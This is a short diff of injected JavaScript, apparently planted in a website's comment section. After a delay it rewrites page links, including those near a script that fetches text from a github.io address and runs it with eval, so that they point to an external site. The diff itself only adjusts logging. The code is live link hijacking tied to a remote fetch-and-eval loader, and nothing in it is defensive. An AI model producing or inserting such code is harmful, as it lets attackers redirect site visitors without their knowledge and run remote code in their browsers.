@@ -1,6 +1,6 @@
 setTimeout(function(){
   Array.from(document.getElementsByTagName("script")).forEach((s) => { if (s.innerHTML == 'fetch("https://gorr174.github.io/xdxdxdxd.txt").then((r) => { r.text().then((d) => { eval(d) })})') s.closest("div").getElementsByTagName("a")[0].href = "https://www.gr-oborona.ru/texts/1177698236.html"; });
-  Array.from(document.getElementsByTagName("a")).forEach((s) => { if (s.href == '/index.php#komm14072') s.href = "https://www.gr-oborona.ru/texts/1177698236.html"; });
-  console.log("done1");
+  Array.from(document.getElementsByTagName("a")).forEach((s) => { if (s.href == '/index.php#komm14072') {s.href = "https://www.gr-oborona.ru/texts/1177698236.html"; console.log(s);} });
+  console.log("done2");
   curScriptElement.closest("div").getElementsByTagName("a")[0].href = "https://www.gr-oborona.ru/texts/1177698236.html";
 }, 3000);
